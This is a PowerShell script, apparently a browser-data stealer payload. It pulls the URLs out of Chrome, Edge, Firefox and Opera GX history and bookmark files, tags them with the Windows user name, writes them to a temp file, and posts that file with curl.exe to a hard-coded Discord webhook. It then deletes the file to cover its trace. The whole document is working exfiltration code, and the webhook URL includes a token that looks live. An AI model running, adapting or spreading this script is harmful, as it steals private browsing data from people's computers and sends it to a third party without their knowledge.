function Get-BrowserData {
    [CmdletBinding()]
    param (
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {$Path = "$env:USERPROFILE\AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}

    $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

$outputPath = "$env:TMP\--BrowserData.txt"

Get-BrowserData -Browser "edge" -DataType "history" >> $outputPath
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $outputPath
Get-BrowserData -Browser "chrome" -DataType "history" >> $outputPath
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $outputPath
Get-BrowserData -Browser "firefox" -DataType "history" >> $outputPath
Get-BrowserData -Browser "opera" -DataType "history" >> $outputPath
Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $outputPath

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"

    $Body = @{
      'username' = $env:UserName
      'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}

Upload-Discord -file $outputPath

Remove-Item $outputPath
